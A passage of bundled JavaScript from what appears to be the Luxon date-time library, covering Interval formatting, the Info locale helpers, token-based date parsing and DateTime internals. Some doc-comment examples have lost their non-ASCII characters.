   * @example Interval.fromISO('2022-11-07T09:00Z/2022-11-08T09:00Z').toLocaleString(); //=> 11/7/2022  11/8/2022
   * @example Interval.fromISO('2022-11-07T09:00Z/2022-11-08T09:00Z').toLocaleString(DateTime.DATE_FULL); //=> November 7  8, 2022
   * @example Interval.fromISO('2022-11-07T09:00Z/2022-11-08T09:00Z').toLocaleString(DateTime.DATE_FULL, { locale: 'fr-FR' }); //=> 78 novembre 2022
   * @example Interval.fromISO('2022-11-07T17:00Z/2022-11-07T19:00Z').toLocaleString(DateTime.TIME_SIMPLE); //=> 6:00  8:00 PM
   * @example Interval.fromISO('2022-11-07T17:00Z/2022-11-07T19:00Z').toLocaleString({ weekday: 'short', month: 'short', day: '2-digit', hour: '2-digit', minute: '2-digit' }); //=> Mon, Nov 07, 6:00  8:00 p
   * @return {string}
   */
  toLocaleString(formatOpts = DATE_SHORT, opts = {}) {
    return this.isValid ? Formatter.create(this.s.loc.clone(opts), formatOpts).formatInterval(this) : INVALID$1;
  }
  /**
   * Returns an ISO 8601-compliant string representation of this Interval.
   * @see https://en.wikipedia.org/wiki/ISO_8601#Time_intervals
   * @param {Object} opts - The same options as {@link DateTime#toISO}
   * @return {string}
   */
  toISO(opts) {
    if (!this.isValid) return INVALID$1;
    return `${this.s.toISO(opts)}/${this.e.toISO(opts)}`;
  }
  /**
   * Returns an ISO 8601-compliant string representation of date of this Interval.
   * The time components are ignored.
   * @see https://en.wikipedia.org/wiki/ISO_8601#Time_intervals
   * @return {string}
   */
  toISODate() {
    if (!this.isValid) return INVALID$1;
    return `${this.s.toISODate()}/${this.e.toISODate()}`;
  }
  /**
   * Returns an ISO 8601-compliant string representation of time of this Interval.
   * The date components are ignored.
   * @see https://en.wikipedia.org/wiki/ISO_8601#Time_intervals
   * @param {Object} opts - The same options as {@link DateTime#toISO}
   * @return {string}
   */
  toISOTime(opts) {
    if (!this.isValid) return INVALID$1;
    return `${this.s.toISOTime(opts)}/${this.e.toISOTime(opts)}`;
  }
  /**
   * Returns a string representation of this Interval formatted according to the specified format
   * string. **You may not want this.** See {@link Interval#toLocaleString} for a more flexible
   * formatting tool.
   * @param {string} dateFormat - The format string. This string formats the start and end time.
   * See {@link DateTime#toFormat} for details.
   * @param {Object} opts - Options.
   * @param {string} [opts.separator =  '  '] - A separator to place between the start and end
   * representations.
   * @return {string}
   */
  toFormat(dateFormat, { separator = "  " } = {}) {
    if (!this.isValid) return INVALID$1;
    return `${this.s.toFormat(dateFormat)}${separator}${this.e.toFormat(dateFormat)}`;
  }
  /**
   * Return a Duration representing the time spanned by this interval.
   * @param {string|string[]} [unit=['milliseconds']] - the unit or units (such as 'hours' or 'days') to include in the duration.
   * @param {Object} opts - options that affect the creation of the Duration
   * @param {string} [opts.conversionAccuracy='casual'] - the conversion system to use
   * @example Interval.fromDateTimes(dt1, dt2).toDuration().toObject() //=> { milliseconds: 88489257 }
   * @example Interval.fromDateTimes(dt1, dt2).toDuration('days').toObject() //=> { days: 1.0241812152777778 }
   * @example Interval.fromDateTimes(dt1, dt2).toDuration(['hours', 'minutes']).toObject() //=> { hours: 24, minutes: 34.82095 }
   * @example Interval.fromDateTimes(dt1, dt2).toDuration(['hours', 'minutes', 'seconds']).toObject() //=> { hours: 24, minutes: 34, seconds: 49.257 }
   * @example Interval.fromDateTimes(dt1, dt2).toDuration('seconds').toObject() //=> { seconds: 88489.257 }
   * @return {Duration}
   */
  toDuration(unit, opts) {
    if (!this.isValid) {
      return Duration.invalid(this.invalidReason);
    }
    return this.e.diff(this.s, unit, opts);
  }
  /**
   * Run mapFn on the interval start and end, returning a new Interval from the resulting DateTimes
   * @param {function} mapFn
   * @return {Interval}
   * @example Interval.fromDateTimes(dt1, dt2).mapEndpoints(endpoint => endpoint.toUTC())
   * @example Interval.fromDateTimes(dt1, dt2).mapEndpoints(endpoint => endpoint.plus({ hours: 2 }))
   */
  mapEndpoints(mapFn) {
    return Interval.fromDateTimes(mapFn(this.s), mapFn(this.e));
  }
}
class Info {
  /**
   * Return whether the specified zone contains a DST.
   * @param {string|Zone} [zone='local'] - Zone to check. Defaults to the environment's local zone.
   * @return {boolean}
   */
  static hasDST(zone = Settings.defaultZone) {
    const proto = DateTime.now().setZone(zone).set({ month: 12 });
    return !zone.isUniversal && proto.offset !== proto.set({ month: 6 }).offset;
  }
  /**
   * Return whether the specified zone is a valid IANA specifier.
   * @param {string} zone - Zone to check
   * @return {boolean}
   */
  static isValidIANAZone(zone) {
    return IANAZone.isValidZone(zone);
  }
  /**
   * Converts the input into a {@link Zone} instance.
   *
   * * If `input` is already a Zone instance, it is returned unchanged.
   * * If `input` is a string containing a valid time zone name, a Zone instance
   *   with that name is returned.
   * * If `input` is a string that doesn't refer to a known time zone, a Zone
   *   instance with {@link Zone#isValid} == false is returned.
   * * If `input is a number, a Zone instance with the specified fixed offset
   *   in minutes is returned.
   * * If `input` is `null` or `undefined`, the default zone is returned.
   * @param {string|Zone|number} [input] - the value to be converted
   * @return {Zone}
   */
  static normalizeZone(input2) {
    return normalizeZone(input2, Settings.defaultZone);
  }
  /**
   * Get the weekday on which the week starts according to the given locale.
   * @param {Object} opts - options
   * @param {string} [opts.locale] - the locale code
   * @param {string} [opts.locObj=null] - an existing locale object to use
   * @returns {number} the start of the week, 1 for Monday through 7 for Sunday
   */
  static getStartOfWeek({ locale = null, locObj = null } = {}) {
    return (locObj || Locale.create(locale)).getStartOfWeek();
  }
  /**
   * Get the minimum number of days necessary in a week before it is considered part of the next year according
   * to the given locale.
   * @param {Object} opts - options
   * @param {string} [opts.locale] - the locale code
   * @param {string} [opts.locObj=null] - an existing locale object to use
   * @returns {number}
   */
  static getMinimumDaysInFirstWeek({ locale = null, locObj = null } = {}) {
    return (locObj || Locale.create(locale)).getMinDaysInFirstWeek();
  }
  /**
   * Get the weekdays, which are considered the weekend according to the given locale
   * @param {Object} opts - options
   * @param {string} [opts.locale] - the locale code
   * @param {string} [opts.locObj=null] - an existing locale object to use
   * @returns {number[]} an array of weekdays, 1 for Monday through 7 for Sunday
   */
  static getWeekendWeekdays({ locale = null, locObj = null } = {}) {
    return (locObj || Locale.create(locale)).getWeekendDays().slice();
  }
  /**
   * Return an array of standalone month names.
   * @see https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/DateTimeFormat
   * @param {string} [length='long'] - the length of the month representation, such as "numeric", "2-digit", "narrow", "short", "long"
   * @param {Object} opts - options
   * @param {string} [opts.locale] - the locale code
   * @param {string} [opts.numberingSystem=null] - the numbering system
   * @param {string} [opts.locObj=null] - an existing locale object to use
   * @param {string} [opts.outputCalendar='gregory'] - the calendar
   * @example Info.months()[0] //=> 'January'
   * @example Info.months('short')[0] //=> 'Jan'
   * @example Info.months('numeric')[0] //=> '1'
   * @example Info.months('short', { locale: 'fr-CA' } )[0] //=> 'janv.'
   * @example Info.months('numeric', { locale: 'ar' })[0] //=> ''
   * @example Info.months('long', { outputCalendar: 'islamic' })[0] //=> 'Rabi I'
   * @return {Array}
   */
  static months(length = "long", { locale = null, numberingSystem = null, locObj = null, outputCalendar = "gregory" } = {}) {
    return (locObj || Locale.create(locale, numberingSystem, outputCalendar)).months(length);
  }
  /**
   * Return an array of format month names.
   * Format months differ from standalone months in that they're meant to appear next to the day of the month. In some languages, that
   * changes the string.
   * See {@link Info#months}
   * @param {string} [length='long'] - the length of the month representation, such as "numeric", "2-digit", "narrow", "short", "long"
   * @param {Object} opts - options
   * @param {string} [opts.locale] - the locale code
   * @param {string} [opts.numberingSystem=null] - the numbering system
   * @param {string} [opts.locObj=null] - an existing locale object to use
   * @param {string} [opts.outputCalendar='gregory'] - the calendar
   * @return {Array}
   */
  static monthsFormat(length = "long", { locale = null, numberingSystem = null, locObj = null, outputCalendar = "gregory" } = {}) {
    return (locObj || Locale.create(locale, numberingSystem, outputCalendar)).months(length, true);
  }
  /**
   * Return an array of standalone week names.
   * @see https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/DateTimeFormat
   * @param {string} [length='long'] - the length of the weekday representation, such as "narrow", "short", "long".
   * @param {Object} opts - options
   * @param {string} [opts.locale] - the locale code
   * @param {string} [opts.numberingSystem=null] - the numbering system
   * @param {string} [opts.locObj=null] - an existing locale object to use
   * @example Info.weekdays()[0] //=> 'Monday'
   * @example Info.weekdays('short')[0] //=> 'Mon'
   * @example Info.weekdays('short', { locale: 'fr-CA' })[0] //=> 'lun.'
   * @example Info.weekdays('short', { locale: 'ar' })[0] //=> ''
   * @return {Array}
   */
  static weekdays(length = "long", { locale = null, numberingSystem = null, locObj = null } = {}) {
    return (locObj || Locale.create(locale, numberingSystem, null)).weekdays(length);
  }
  /**
   * Return an array of format week names.
   * Format weekdays differ from standalone weekdays in that they're meant to appear next to more date information. In some languages, that
   * changes the string.
   * See {@link Info#weekdays}
   * @param {string} [length='long'] - the length of the month representation, such as "narrow", "short", "long".
   * @param {Object} opts - options
   * @param {string} [opts.locale=null] - the locale code
   * @param {string} [opts.numberingSystem=null] - the numbering system
   * @param {string} [opts.locObj=null] - an existing locale object to use
   * @return {Array}
   */
  static weekdaysFormat(length = "long", { locale = null, numberingSystem = null, locObj = null } = {}) {
    return (locObj || Locale.create(locale, numberingSystem, null)).weekdays(length, true);
  }
  /**
   * Return an array of meridiems.
   * @param {Object} opts - options
   * @param {string} [opts.locale] - the locale code
   * @example Info.meridiems() //=> [ 'AM', 'PM' ]
   * @example Info.meridiems({ locale: 'my' }) //=> [ '', '' ]
   * @return {Array}
   */
  static meridiems({ locale = null } = {}) {
    return Locale.create(locale).meridiems();
  }
  /**
   * Return an array of eras, such as ['BC', 'AD']. The locale can be specified, but the calendar system is always Gregorian.
   * @param {string} [length='short'] - the length of the era representation, such as "short" or "long".
   * @param {Object} opts - options
   * @param {string} [opts.locale] - the locale code
   * @example Info.eras() //=> [ 'BC', 'AD' ]
   * @example Info.eras('long') //=> [ 'Before Christ', 'Anno Domini' ]
   * @example Info.eras('long', { locale: 'fr' }) //=> [ 'avant Jsus-Christ', 'aprs Jsus-Christ' ]
   * @return {Array}
   */
  static eras(length = "short", { locale = null } = {}) {
    return Locale.create(locale, null, "gregory").eras(length);
  }
  /**
   * Return the set of available features in this environment.
   * Some features of Luxon are not available in all environments. For example, on older browsers, relative time formatting support is not available. Use this function to figure out if that's the case.
   * Keys:
   * * `relative`: whether this environment supports relative time formatting
   * * `localeWeek`: whether this environment supports different weekdays for the start of the week based on the locale
   * @example Info.features() //=> { relative: false, localeWeek: true }
   * @return {Object}
   */
  static features() {
    return { relative: hasRelative(), localeWeek: hasLocaleWeekInfo() };
  }
}
function dayDiff(earlier, later) {
  const utcDayStart = (dt) => dt.toUTC(0, { keepLocalTime: true }).startOf("day").valueOf(), ms = utcDayStart(later) - utcDayStart(earlier);
  return Math.floor(Duration.fromMillis(ms).as("days"));
}
function highOrderDiffs(cursor, later, units) {
  const differs = [
    ["years", (a, b) => b.year - a.year],
    ["quarters", (a, b) => b.quarter - a.quarter + (b.year - a.year) * 4],
    ["months", (a, b) => b.month - a.month + (b.year - a.year) * 12],
    [
      "weeks",
      (a, b) => {
        const days = dayDiff(a, b);
        return (days - days % 7) / 7;
      }
    ],
    ["days", dayDiff]
  ];
  const results = {};
  const earlier = cursor;
  let lowestOrder, highWater;
  for (const [unit, differ] of differs) {
    if (units.indexOf(unit) >= 0) {
      lowestOrder = unit;
      results[unit] = differ(cursor, later);
      highWater = earlier.plus(results);
      if (highWater > later) {
        results[unit]--;
        cursor = earlier.plus(results);
        if (cursor > later) {
          highWater = cursor;
          results[unit]--;
          cursor = earlier.plus(results);
        }
      } else {
        cursor = highWater;
      }
    }
  }
  return [cursor, results, highWater, lowestOrder];
}
function diff(earlier, later, units, opts) {
  let [cursor, results, highWater, lowestOrder] = highOrderDiffs(earlier, later, units);
  const remainingMillis = later - cursor;
  const lowerOrderUnits = units.filter(
    (u) => ["hours", "minutes", "seconds", "milliseconds"].indexOf(u) >= 0
  );
  if (lowerOrderUnits.length === 0) {
    if (highWater < later) {
      highWater = cursor.plus({ [lowestOrder]: 1 });
    }
    if (highWater !== cursor) {
      results[lowestOrder] = (results[lowestOrder] || 0) + remainingMillis / (highWater - cursor);
    }
  }
  const duration = Duration.fromObject(results, opts);
  if (lowerOrderUnits.length > 0) {
    return Duration.fromMillis(remainingMillis, opts).shiftTo(...lowerOrderUnits).plus(duration);
  } else {
    return duration;
  }
}
const MISSING_FTP = "missing Intl.DateTimeFormat.formatToParts support";
function intUnit(regex, post = (i2) => i2) {
  return { regex, deser: ([s2]) => post(parseDigits(s2)) };
}
const NBSP = String.fromCharCode(160);
const spaceOrNBSP = `[ ${NBSP}]`;
const spaceOrNBSPRegExp = new RegExp(spaceOrNBSP, "g");
function fixListRegex(s2) {
  return s2.replace(/\./g, "\\.?").replace(spaceOrNBSPRegExp, spaceOrNBSP);
}
function stripInsensitivities(s2) {
  return s2.replace(/\./g, "").replace(spaceOrNBSPRegExp, " ").toLowerCase();
}
function oneOf(strings, startIndex) {
  if (strings === null) {
    return null;
  } else {
    return {
      regex: RegExp(strings.map(fixListRegex).join("|")),
      deser: ([s2]) => strings.findIndex((i2) => stripInsensitivities(s2) === stripInsensitivities(i2)) + startIndex
    };
  }
}
function offset(regex, groups) {
  return { regex, deser: ([, h, m3]) => signedOffset(h, m3), groups };
}
function simple(regex) {
  return { regex, deser: ([s2]) => s2 };
}
function escapeToken(value) {
  return value.replace(/[\-\[\]{}()*+?.,\\\^$|#\s]/g, "\\$&");
}
function unitForToken(token, loc) {
  const one = digitRegex(loc), two = digitRegex(loc, "{2}"), three = digitRegex(loc, "{3}"), four = digitRegex(loc, "{4}"), six = digitRegex(loc, "{6}"), oneOrTwo = digitRegex(loc, "{1,2}"), oneToThree = digitRegex(loc, "{1,3}"), oneToSix = digitRegex(loc, "{1,6}"), oneToNine = digitRegex(loc, "{1,9}"), twoToFour = digitRegex(loc, "{2,4}"), fourToSix = digitRegex(loc, "{4,6}"), literal = (t) => ({ regex: RegExp(escapeToken(t.val)), deser: ([s2]) => s2, literal: true }), unitate = (t) => {
    if (token.literal) {
      return literal(t);
    }
    switch (t.val) {
      case "G":
        return oneOf(loc.eras("short"), 0);
      case "GG":
        return oneOf(loc.eras("long"), 0);
      case "y":
        return intUnit(oneToSix);
      case "yy":
        return intUnit(twoToFour, untruncateYear);
      case "yyyy":
        return intUnit(four);
      case "yyyyy":
        return intUnit(fourToSix);
      case "yyyyyy":
        return intUnit(six);
      case "M":
        return intUnit(oneOrTwo);
      case "MM":
        return intUnit(two);
      case "MMM":
        return oneOf(loc.months("short", true), 1);
      case "MMMM":
        return oneOf(loc.months("long", true), 1);
      case "L":
        return intUnit(oneOrTwo);
      case "LL":
        return intUnit(two);
      case "LLL":
        return oneOf(loc.months("short", false), 1);
      case "LLLL":
        return oneOf(loc.months("long", false), 1);
      case "d":
        return intUnit(oneOrTwo);
      case "dd":
        return intUnit(two);
      case "o":
        return intUnit(oneToThree);
      case "ooo":
        return intUnit(three);
      case "HH":
        return intUnit(two);
      case "H":
        return intUnit(oneOrTwo);
      case "hh":
        return intUnit(two);
      case "h":
        return intUnit(oneOrTwo);
      case "mm":
        return intUnit(two);
      case "m":
        return intUnit(oneOrTwo);
      case "q":
        return intUnit(oneOrTwo);
      case "qq":
        return intUnit(two);
      case "s":
        return intUnit(oneOrTwo);
      case "ss":
        return intUnit(two);
      case "S":
        return intUnit(oneToThree);
      case "SSS":
        return intUnit(three);
      case "u":
        return simple(oneToNine);
      case "uu":
        return simple(oneOrTwo);
      case "uuu":
        return intUnit(one);
      case "a":
        return oneOf(loc.meridiems(), 0);
      case "kkkk":
        return intUnit(four);
      case "kk":
        return intUnit(twoToFour, untruncateYear);
      case "W":
        return intUnit(oneOrTwo);
      case "WW":
        return intUnit(two);
      case "E":
      case "c":
        return intUnit(one);
      case "EEE":
        return oneOf(loc.weekdays("short", false), 1);
      case "EEEE":
        return oneOf(loc.weekdays("long", false), 1);
      case "ccc":
        return oneOf(loc.weekdays("short", true), 1);
      case "cccc":
        return oneOf(loc.weekdays("long", true), 1);
      case "Z":
      case "ZZ":
        return offset(new RegExp(`([+-]${oneOrTwo.source})(?::(${two.source}))?`), 2);
      case "ZZZ":
        return offset(new RegExp(`([+-]${oneOrTwo.source})(${two.source})?`), 2);
      case "z":
        return simple(/[a-z_+-/]{1,256}?/i);
      case " ":
        return simple(/[^\S\n\r]/);
      default:
        return literal(t);
    }
  };
  const unit = unitate(token) || {
    invalidReason: MISSING_FTP
  };
  unit.token = token;
  return unit;
}
const partTypeStyleToTokenVal = {
  year: {
    "2-digit": "yy",
    numeric: "yyyyy"
  },
  month: {
    numeric: "M",
    "2-digit": "MM",
    short: "MMM",
    long: "MMMM"
  },
  day: {
    numeric: "d",
    "2-digit": "dd"
  },
  weekday: {
    short: "EEE",
    long: "EEEE"
  },
  dayperiod: "a",
  dayPeriod: "a",
  hour12: {
    numeric: "h",
    "2-digit": "hh"
  },
  hour24: {
    numeric: "H",
    "2-digit": "HH"
  },
  minute: {
    numeric: "m",
    "2-digit": "mm"
  },
  second: {
    numeric: "s",
    "2-digit": "ss"
  },
  timeZoneName: {
    long: "ZZZZZ",
    short: "ZZZ"
  }
};
function tokenForPart(part, formatOpts, resolvedOpts) {
  const { type, value } = part;
  if (type === "literal") {
    const isSpace = /^\s+$/.test(value);
    return {
      literal: !isSpace,
      val: isSpace ? " " : value
    };
  }
  const style = formatOpts[type];
  let actualType = type;
  if (type === "hour") {
    if (formatOpts.hour12 != null) {
      actualType = formatOpts.hour12 ? "hour12" : "hour24";
    } else if (formatOpts.hourCycle != null) {
      if (formatOpts.hourCycle === "h11" || formatOpts.hourCycle === "h12") {
        actualType = "hour12";
      } else {
        actualType = "hour24";
      }
    } else {
      actualType = resolvedOpts.hour12 ? "hour12" : "hour24";
    }
  }
  let val = partTypeStyleToTokenVal[actualType];
  if (typeof val === "object") {
    val = val[style];
  }
  if (val) {
    return {
      literal: false,
      val
    };
  }
  return void 0;
}
function buildRegex(units) {
  const re = units.map((u) => u.regex).reduce((f, r) => `${f}(${r.source})`, "");
  return [`^${re}$`, units];
}
function match(input2, regex, handlers) {
  const matches = input2.match(regex);
  if (matches) {
    const all = {};
    let matchIndex = 1;
    for (const i2 in handlers) {
      if (hasOwnProperty(handlers, i2)) {
        const h = handlers[i2], groups = h.groups ? h.groups + 1 : 1;
        if (!h.literal && h.token) {
          all[h.token.val[0]] = h.deser(matches.slice(matchIndex, matchIndex + groups));
        }
        matchIndex += groups;
      }
    }
    return [matches, all];
  } else {
    return [matches, {}];
  }
}
function dateTimeFromMatches(matches) {
  const toField = (token) => {
    switch (token) {
      case "S":
        return "millisecond";
      case "s":
        return "second";
      case "m":
        return "minute";
      case "h":
      case "H":
        return "hour";
      case "d":
        return "day";
      case "o":
        return "ordinal";
      case "L":
      case "M":
        return "month";
      case "y":
        return "year";
      case "E":
      case "c":
        return "weekday";
      case "W":
        return "weekNumber";
      case "k":
        return "weekYear";
      case "q":
        return "quarter";
      default:
        return null;
    }
  };
  let zone = null;
  let specificOffset;
  if (!isUndefined(matches.z)) {
    zone = IANAZone.create(matches.z);
  }
  if (!isUndefined(matches.Z)) {
    if (!zone) {
      zone = new FixedOffsetZone(matches.Z);
    }
    specificOffset = matches.Z;
  }
  if (!isUndefined(matches.q)) {
    matches.M = (matches.q - 1) * 3 + 1;
  }
  if (!isUndefined(matches.h)) {
    if (matches.h < 12 && matches.a === 1) {
      matches.h += 12;
    } else if (matches.h === 12 && matches.a === 0) {
      matches.h = 0;
    }
  }
  if (matches.G === 0 && matches.y) {
    matches.y = -matches.y;
  }
  if (!isUndefined(matches.u)) {
    matches.S = parseMillis(matches.u);
  }
  const vals = Object.keys(matches).reduce((r, k) => {
    const f = toField(k);
    if (f) {
      r[f] = matches[k];
    }
    return r;
  }, {});
  return [vals, zone, specificOffset];
}
let dummyDateTimeCache = null;
function getDummyDateTime() {
  if (!dummyDateTimeCache) {
    dummyDateTimeCache = DateTime.fromMillis(1555555555555);
  }
  return dummyDateTimeCache;
}
function maybeExpandMacroToken(token, locale) {
  if (token.literal) {
    return token;
  }
  const formatOpts = Formatter.macroTokenToFormatOpts(token.val);
  const tokens = formatOptsToTokens(formatOpts, locale);
  if (tokens == null || tokens.includes(void 0)) {
    return token;
  }
  return tokens;
}
function expandMacroTokens(tokens, locale) {
  return Array.prototype.concat(...tokens.map((t) => maybeExpandMacroToken(t, locale)));
}
class TokenParser {
  constructor(locale, format) {
    this.locale = locale;
    this.format = format;
    this.tokens = expandMacroTokens(Formatter.parseFormat(format), locale);
    this.units = this.tokens.map((t) => unitForToken(t, locale));
    this.disqualifyingUnit = this.units.find((t) => t.invalidReason);
    if (!this.disqualifyingUnit) {
      const [regexString, handlers] = buildRegex(this.units);
      this.regex = RegExp(regexString, "i");
      this.handlers = handlers;
    }
  }
  explainFromTokens(input2) {
    if (!this.isValid) {
      return { input: input2, tokens: this.tokens, invalidReason: this.invalidReason };
    } else {
      const [rawMatches, matches] = match(input2, this.regex, this.handlers), [result, zone, specificOffset] = matches ? dateTimeFromMatches(matches) : [null, null, void 0];
      if (hasOwnProperty(matches, "a") && hasOwnProperty(matches, "H")) {
        throw new ConflictingSpecificationError(
          "Can't include meridiem when specifying 24-hour format"
        );
      }
      return {
        input: input2,
        tokens: this.tokens,
        regex: this.regex,
        rawMatches,
        matches,
        result,
        zone,
        specificOffset
      };
    }
  }
  get isValid() {
    return !this.disqualifyingUnit;
  }
  get invalidReason() {
    return this.disqualifyingUnit ? this.disqualifyingUnit.invalidReason : null;
  }
}
function explainFromTokens(locale, input2, format) {
  const parser = new TokenParser(locale, format);
  return parser.explainFromTokens(input2);
}
function parseFromTokens(locale, input2, format) {
  const { result, zone, specificOffset, invalidReason } = explainFromTokens(locale, input2, format);
  return [result, zone, specificOffset, invalidReason];
}
function formatOptsToTokens(formatOpts, locale) {
  if (!formatOpts) {
    return null;
  }
  const formatter = Formatter.create(locale, formatOpts);
  const df = formatter.dtFormatter(getDummyDateTime());
  const parts = df.formatToParts();
  const resolvedOpts = df.resolvedOptions();
  return parts.map((p) => tokenForPart(p, formatOpts, resolvedOpts));
}
const INVALID = "Invalid DateTime";
const MAX_DATE = 864e13;
function unsupportedZone(zone) {
  return new Invalid("unsupported zone", `the zone "${zone.name}" is not supported`);
}
function possiblyCachedWeekData(dt) {
  if (dt.weekData === null) {
    dt.weekData = gregorianToWeek(dt.c);
  }
  return dt.weekData;
}
function possiblyCachedLocalWeekData(dt) {
  if (dt.localWeekData === null) {
    dt.localWeekData = gregorianToWeek(
      dt.c,
      dt.loc.getMinDaysInFirstWeek(),
      dt.loc.getStartOfWeek()
    );
  }
  return dt.localWeekData;
}
function clone(inst, alts) {
  const current = {
    ts: inst.ts,
    zone: inst.zone,
    c: inst.c,
    o: inst.o,
    loc: inst.loc,
    invalid: inst.invalid
  };
  return new DateTime({ ...current, ...alts, old: current });
}
function fixOffset(localTS, o, tz) {
  let utcGuess = localTS - o * 60 * 1e3;
  const o2 = tz.offset(utcGuess);
  if (o === o2) {
    return [utcGuess, o];
  }
  utcGuess -= (o2 - o) * 60 * 1e3;
  const o3 = tz.offset(utcGuess);
  if (o2 === o3) {
    return [utcGuess, o2];
  }
  return [localTS - Math.min(o2, o3) * 60 * 1e3, Math.max(o2, o3)];
}
function tsToObj(ts, offset2) {
  ts += offset2 * 60 * 1e3;
  const d3 = new Date(ts);
  return {
    year: d3.getUTCFullYear(),
    month: d3.getUTCMonth() + 1,
    day: d3.getUTCDate(),
    hour: d3.getUTCHours(),
    minute: d3.getUTCMinutes(),
    second: d3.getUTCSeconds(),
    millisecond: d3.getUTCMilliseconds()
  };
}
function objToTS(obj, offset2, zone) {
  return fixOffset(objToLocalTS(obj), offset2, zone);
}
function adjustTime(inst, dur) {
  const oPre = inst.o, year = inst.c.year + Math.trunc(dur.years), month = inst.c.month + Math.trunc(dur.months) + Math.trunc(dur.quarters) * 3, c = {
    ...inst.c,
    year,
    month,
    day: Math.min(inst.c.day, daysInMonth(year, month)) + Math.trunc(dur.days) + Math.trunc(dur.weeks) * 7
  }, millisToAdd = Duration.fromObject({
    years: dur.years - Math.trunc(dur.years),
    quarters: dur.quarters - Math.trunc(dur.quarters),
    months: dur.months - Math.trunc(dur.months),
    weeks: dur.weeks - Math.trunc(dur.weeks),
    days: dur.days - Math.trunc(dur.days),
    hours: dur.hours,
    minutes: dur.minutes,
    seconds: dur.seconds,
    milliseconds: dur.milliseconds
  }).as("milliseconds"), localTS = objToLocalTS(c);
  let [ts, o] = fixOffset(localTS, oPre, inst.zone);
  if (millisToAdd !== 0) {
    ts += millisToAdd;
    o = inst.zone.offset(ts);
  }
  return { ts, o };
}
function parseDataToDateTime(parsed, parsedZone, opts, format, text, specificOffset) {
  const { setZone, zone } = opts;
  if (parsed && Object.keys(parsed).length !== 0 || parsedZone) {
    const interpretationZone = parsedZone || zone, inst = DateTime.fromObject(parsed, {
      ...opts,
      zone: interpretationZone,
      specificOffset
    });
    return setZone ? inst : inst.setZone(zone);
  } else {
    return DateTime.invalid(
      new Invalid("unparsable", `the input "${text}" can't be parsed as ${format}`)
    );
  }
}
function toTechFormat(dt, format, allowZ = true) {
  return dt.isValid ? Formatter.create(Locale.create("en-US"), {
    allowZ,
    forceSimple: true
  }).formatDateTimeFromString(dt, format) : null;
}
function toISODate(o, extended) {
  const longFormat = o.c.year > 9999 || o.c.year < 0;
  let c = "";
  if (longFormat && o.c.year >= 0) c += "+";
  c += padStart(o.c.year, longFormat ? 6 : 4);
  if (extended) {
    c += "-";
    c += padStart(o.c.month);
    c += "-";
    c += padStart(o.c.day);
  } else {
    c += padStart(o.c.month);
    c += padStart(o.c.day);
  }
  return c;
}
function toISOTime(o, extended, suppressSeconds, suppressMilliseconds, includeOffset, extendedZone) {
  let c = padStart(o.c.hour);
  if (extended) {
    c += ":";
    c += padStart(o.c.minute);
    if (o.c.millisecond !== 0 || o.c.second !== 0 || !suppressSeconds) {
      c += ":";
    }
  } else {
    c += padStart(o.c.minute);
  }
  if (o.c.millisecond !== 0 || o.c.second !== 0 || !suppressSeconds) {
    c += padStart(o.c.second);
    if (o.c.millisecond !== 0 || !suppressMilliseconds) {
      c += ".";
      c += padStart(o.c.millisecond, 3);
    }
  }
  if (includeOffset) {
    if (o.isOffsetFixed && o.offset === 0 && !extendedZone) {
      c += "Z";
    } else if (o.o < 0) {
      c += "-";
      c += padStart(Math.trunc(-o.o / 60));
      c += ":";
      c += padStart(Math.trunc(-o.o % 60));
    } else {
      c += "+";
      c += padStart(Math.trunc(o.o / 60));
      c += ":";
      c += padStart(Math.trunc(o.o % 60));
    }
  }
  if (extendedZone) {
    c += "[" + o.zone.ianaName + "]";
  }
  return c;
}
const defaultUnitValues = {
  month: 1,
  day: 1,
  hour: 0,
  minute: 0,
  second: 0,
  millisecond: 0
}, defaultWeekUnitValues = {
  weekNumber: 1,
  weekday: 1,
  hour: 0,
  minute: 0,
  second: 0,
  millisecond: 0
}, defaultOrdinalUnitValues = {
  ordinal: 1,
  hour: 0,
  minute: 0,
  second: 0,
  millisecond: 0
};
const orderedUnits = ["year", "month", "day", "hour", "minute", "second", "millisecond"], orderedWeekUnits = [
  "weekYear",
  "weekNumber",
  "weekday",
  "hour",
  "minute",
  "second",
  "millisecond"
], orderedOrdinalUnits = ["year", "ordinal", "hour", "minute", "second", "millisecond"];
function normalizeUnit(unit) {
  const normalized = {
    year: "year",
    years: "year",
    month: "month",
    months: "month",
    day: "day",
    days: "day",
    hour: "hour",
    hours: "hour",
    minute: "minute",
    minutes: "minute",
    quarter: "quarter",
    quarters: "quarter",
    second: "second",
    seconds: "second",
    millisecond: "millisecond",
    milliseconds: "millisecond",
    weekday: "weekday",
    weekdays: "weekday",
    weeknumber: "weekNumber",
    weeksnumber: "weekNumber",
    weeknumbers: "weekNumber",
    weekyear: "weekYear",
    weekyears: "weekYear",
    ordinal: "ordinal"
  }[unit.toLowerCase()];
  if (!normalized) throw new InvalidUnitError(unit);
  return normalized;
}
function normalizeUnitWithLocalWeeks(unit) {
  switch (unit.toLowerCase()) {
    case "localweekday":
    case "localweekdays":
      return "localWeekday";
    case "localweeknumber":
    case "localweeknumbers":
      return "localWeekNumber";
    case "localweekyear":
    case "localweekyears":
      return "localWeekYear";
    default:
      return normalizeUnit(unit);
  }
}
function guessOffsetForZone(zone) {
  if (!zoneOffsetGuessCache[zone]) {
    if (zoneOffsetTs === void 0) {
      zoneOffsetTs = Settings.now();
    }
    zoneOffsetGuessCache[zone] = zone.offset(zoneOffsetTs);
  }
  return zoneOffsetGuessCache[zone];
}
function quickDT(obj, opts) {
  const zone = normalizeZone(opts.zone, Settings.defaultZone);
  if (!zone.isValid) {
    return DateTime.invalid(unsupportedZone(zone));
  }
  const loc = Locale.fromObject(opts);
  let ts, o;
  if (!isUndefined(obj.year)) {
    for (const u of orderedUnits) {
      if (isUndefined(obj[u])) {
        obj[u] = defaultUnitValues[u];
      }
    }
    const invalid = hasInvalidGregorianData(obj) || hasInvalidTimeData(obj);
    if (invalid) {
      return DateTime.invalid(invalid);
    }
    const offsetProvis = guessOffsetForZone(zone);
    [ts, o] = objToTS(obj, offsetProvis, zone);
  } else {
    ts = Settings.now();
  }
  return new DateTime({ ts, zone, loc, o });
}
function diffRelative(start2, end2, opts) {
  const round2 = isUndefined(opts.round) ? true : opts.round, format = (c, unit) => {
    c = roundTo(c, round2 || opts.calendary ? 0 : 2, true);
    const formatter = end2.loc.clone(opts).relFormatter(opts);
    return formatter.format(c, unit);
  }, differ = (unit) => {
    if (opts.calendary) {
      if (!end2.hasSame(start2, unit)) {
